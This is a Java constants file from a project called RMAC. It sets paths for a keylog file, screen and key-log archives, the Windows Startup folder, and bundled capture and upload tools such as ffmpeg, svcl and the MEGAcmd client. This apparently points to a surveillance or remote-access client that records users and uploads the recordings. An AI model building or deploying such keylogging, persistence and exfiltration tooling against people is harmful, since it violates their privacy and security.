package com.rmac.utils;

import com.rmac.Main;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;

public class Constants {

  public static String TEMP_LOCATION = System.getenv("TEMP");
  public static String USER_HOME = System.getProperty("user.home");
  public static String STARTUP_LOCATION =
      Constants.USER_HOME + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
  public static String SYS_TEMP_LOCATION = System.getenv("windir") + "\\Temp";

  public static String CURRENT_LOCATION;
  public static String KEYLOG_LOCATION;
  public static String LOG_LOCATION;
  public static String ARCHIVES_LOCATION;
  public static String SCREEN_ARCHIVE_LOCATION;
  public static String LOG_ARCHIVE_LOCATION;
  public static String OTHER_ARCHIVE_LOCATION;
  public static String PENDING_ARCHIVES_LOCATION;

  public static String RUNTIME_LOCATION;
  public static String CONFIG_LOCATION;
  public static String NIRCMD_LOCATION;
  public static String FFMPEG_LOCATION;
  public static String MEGACMD_LOCATION;
  public static String MEGACLIENT_LOCATION;
  public static String MEGASERVER_LOCATION;
  public static String JRE_LOCATION;
  public static String SCRIPTS_LOCATION;
  public static String SVCL_LOCATION;
  public static String INSTANCE_LOCK_LOCATION;
  public static String RMAC_DLL_LOCATION;

  public static void setRuntimeLocation(String runtimeLocation) {
    RUNTIME_LOCATION = runtimeLocation;
    CONFIG_LOCATION = Constants.RUNTIME_LOCATION + "\\config.rmac";
    NIRCMD_LOCATION = Constants.RUNTIME_LOCATION + "\\nircmd.exe";
    FFMPEG_LOCATION = Constants.RUNTIME_LOCATION + "\\ffmpeg.exe";
    MEGACMD_LOCATION = Constants.RUNTIME_LOCATION + "\\megacmd";
    MEGACLIENT_LOCATION = Constants.MEGACMD_LOCATION + "\\MEGAclient.exe";
    MEGASERVER_LOCATION = Constants.MEGACMD_LOCATION + "\\MEGAcmdServer.exe";
    JRE_LOCATION = Constants.RUNTIME_LOCATION + "\\jre";
    SCRIPTS_LOCATION = Constants.RUNTIME_LOCATION + "\\scripts";
    SVCL_LOCATION = Constants.RUNTIME_LOCATION + "\\svcl.exe";
    INSTANCE_LOCK_LOCATION = Constants.RUNTIME_LOCATION + "\\client.lock";
    RMAC_DLL_LOCATION = RUNTIME_LOCATION + "\\" + "rmac-native.dll";
  }

  public static boolean setCurrentLocation() {
    try {
      CURRENT_LOCATION = URLDecoder.decode(
          Main.class
              .getProtectionDomain()
              .getCodeSource()
              .getLocation()
              .toString()
              .replace("file:/", "")
              .replace("/", "\\")
              .trim(),
          StandardCharsets.UTF_8.name()
      );
      CURRENT_LOCATION = CURRENT_LOCATION.substring(0, CURRENT_LOCATION.lastIndexOf('\\'));

      KEYLOG_LOCATION = Constants.CURRENT_LOCATION + "\\key.txt";
      LOG_LOCATION = Constants.CURRENT_LOCATION + "\\log.txt";
      ARCHIVES_LOCATION = Constants.CURRENT_LOCATION + "\\archives";
      SCREEN_ARCHIVE_LOCATION = Constants.ARCHIVES_LOCATION + "\\screen";
      LOG_ARCHIVE_LOCATION = Constants.ARCHIVES_LOCATION + "\\key";
      OTHER_ARCHIVE_LOCATION = Constants.ARCHIVES_LOCATION + "\\other";
      PENDING_ARCHIVES_LOCATION = Constants.ARCHIVES_LOCATION + "\\pending";
    } catch (UnsupportedEncodingException e) {
      System.err.println("Could not set current location of RMAC executable");
      return false;
    }
    return true;
  }
}
